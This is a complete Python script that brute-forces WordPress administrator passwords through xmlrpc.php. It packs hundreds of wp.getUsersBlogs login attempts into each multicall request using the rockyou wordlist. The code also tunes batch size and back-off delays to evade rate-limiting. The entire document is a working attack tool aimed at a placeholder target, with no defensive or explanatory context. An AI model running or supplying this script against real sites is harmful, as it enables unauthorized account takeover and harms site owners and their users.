import time
import xmlrpc.client
from xmlrpc.client import ProtocolError

# Target details
# Replace x.x.x.x with target ip or domain name
target_url = "http://x.x.x.x/xmlrpc.php"
username = "admin"
password_file = "/usr/share/wordlists/rockyou.txt"
max_batch_size = 500  # Start smaller to avoid immediate rate-limiting, upper limit ~1999
min_batch_size = 50
initial_delay = 2  # Start with a 2-second delay
max_delay = 60  # Cap delay at 60 seconds for rate-limiting
max_retries = 5  # Retry a batch up to 5 times on failure

# Load passwords from file
def load_passwords(password_file):
    with open(password_file, "r", encoding="utf-8", errors="ignore") as pf:
        return [line.strip() for line in pf.readlines()]

# Multicall brute force function
def multicall_bruteforce(url, username, passwords, max_batch_size, min_batch_size, initial_delay, max_delay, max_retries):
    proxy = xmlrpc.client.ServerProxy(url)
    batch_size = max_batch_size
    delay = initial_delay
    total_attempts = 0

    for i in range(0, len(passwords), batch_size):
        batch_passwords = passwords[i:i+batch_size]
        multicall = xmlrpc.client.MultiCall(proxy)
        for password in batch_passwords:
            multicall.wp.getUsersBlogs(username, password)

        retries = 0
        while retries < max_retries:
            try:
                start_time = time.time()
                responses = multicall()
                request_duration = time.time() - start_time

                # Process responses
                for password, response in zip(batch_passwords, responses):
                    if response:
                        print(f"Success: Username: {username}, Password: {password}")
                total_attempts += len(batch_passwords)
                print(f"Total Attempts So Far: {total_attempts}")

                # Adjust batch size and delay
                if request_duration < 1 and batch_size < max_batch_size:
                    batch_size = min(batch_size + 50, max_batch_size)
                    print(f"Increasing batch size to {batch_size}")
                elif request_duration > 3:
                    batch_size = max(batch_size - 50, min_batch_size)
                    print(f"Reducing batch size to {batch_size}")

                # Reset delay after successful batch
                delay = initial_delay
                break

            except xmlrpc.client.Fault as fault:
                if "Incorrect username or password" in str(fault):
                    print("Incorrect credentials detected, continuing...")
                    break
                else:
                    print(f"Server Fault: {fault}")
                    delay = min(delay * 2, max_delay)
                    print(f"Adjusting delay to {delay} seconds")
                    time.sleep(delay)
            except (TimeoutError, ProtocolError) as e:
                print(f"Connection issue: {e}")
                retries += 1
                delay = min(delay * 2, max_delay)
                print(f"Retrying... Attempt {retries}/{max_retries}. Adjusting delay to {delay} seconds.")
                time.sleep(delay)
            except Exception as e:
                print(f"Unexpected error: {e}")
                retries += 1
                time.sleep(delay)

        # Final delay to handle rate-limiting
        time.sleep(delay)

# Load passwords
passwords = load_passwords(password_file)

# Run brute force with error handling
multicall_bruteforce(target_url, username, passwords, max_batch_size, min_batch_size, initial_delay, max_delay, max_retries)

